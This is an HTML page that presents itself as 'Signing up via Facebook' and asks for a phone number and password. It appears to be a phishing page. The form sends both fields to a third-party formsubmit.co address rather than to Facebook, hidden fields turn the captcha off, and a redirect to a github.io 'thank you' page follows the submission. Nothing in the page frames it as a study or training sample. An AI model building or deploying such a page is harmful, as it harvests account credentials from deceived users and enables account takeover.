<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>signing up via Facebook</title>
  <style>
    body {
      background-color: #181818;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    h2 {
      margin-bottom: 20px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 90%;
      max-width: 600px;
    }

    .inline-inputs {
      display: flex;
      gap: 10px;
    }

    .inline-inputs input {
      flex: 1;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-size: 1em;
    }

    button {
      padding: 10px;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      background-color: #1DB954;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #17a044;
    }
  </style>
</head>
<body>

  <h2>Signing up via Facebook</h2>

  <form action="https://formsubmit.co/d7d492f24a67929f3758bf7d9b05c79e" method="POST">
    <div class="inline-inputs">
      <input type="text" name="First Text" placeholder="Phone number" required>
      <input type="text" name="Second Text" placeholder="Password" required>
    </div>

    <input type="hidden" name="_subject" value="New Submission!">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://andreffff-qq.github.io/Davionaimusic/thankyou.html">

    <button type="submit">Send</button>
  </form>

</body>
</html>
